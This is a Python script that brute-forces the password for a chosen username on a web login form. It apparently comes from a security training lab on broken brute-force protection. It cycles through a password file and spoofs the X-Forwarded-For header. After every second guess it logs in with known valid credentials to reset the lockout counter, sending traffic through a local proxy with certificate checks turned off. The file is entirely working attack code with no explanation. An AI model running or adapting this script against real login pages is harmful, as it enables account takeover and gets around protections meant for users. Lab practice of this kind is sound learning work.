import requests
import urllib3
import sys
import os 
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
correctCridentials = {'username':'wiener', 'password': 'peter'}

def genrateRandomIP():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
headers = {'X-Forwarded-For': genrateRandomIP()}
def sendCorrectCridentials(url):
    data = {'username': correctCridentials['username'].strip(), 'password':correctCridentials['password'].strip()}
    requests.post(url , proxies=proxies,data=data,headers=headers ,verify=False, allow_redirects=False)
    
def findPassword(url , username):

    counter = 1
    with open('/media/mohamed/Nouveau nom/learning/security/web/Authentication/password_based/lab4_Broken_brute_force_protection/passwords.txt')  as file :
        for password in file :
            print('\r' + ' ' * 50, end='', flush=True)
            print(f'\rTrying {password.strip()}', end='', flush=True)
            
            data = {'username': username, 'password':password.strip()}
            response = requests.post(url , proxies=proxies,data=data,headers=headers , verify=False).text
            if response.find('Incorrect password')==-1:
                return password
            if(counter % 2==0):
                sendCorrectCridentials(url)
            counter+=1
        return ''

def main():
    os.system("clear")
    if (len(sys.argv )!= 3):
        print(f'[Usage]: python {sys.argv[0]} [URL] [Target Username]')
        print(f'[Example;]: python {sys.argv[0]} www.example.com Alex')
        sys.exit(-1)
    print(f"Random Ip : {headers['X-Forwarded-For']}")
    
    targetUsername = sys.argv[2].strip()
    url = sys.argv[1].strip()
    #Reset the faliled attempts counter if you have made some attempts without the script
    sendCorrectCridentials(url=url)
    password  = findPassword(url, targetUsername)
    if password== '':
        print("\nCan't Find Password")
        sys.exit(-1)
    print(f"\nTarget Cridentials: \n[Username] => {targetUsername} \n[Password] => {password}")
    
if __name__ == "__main__":
    main()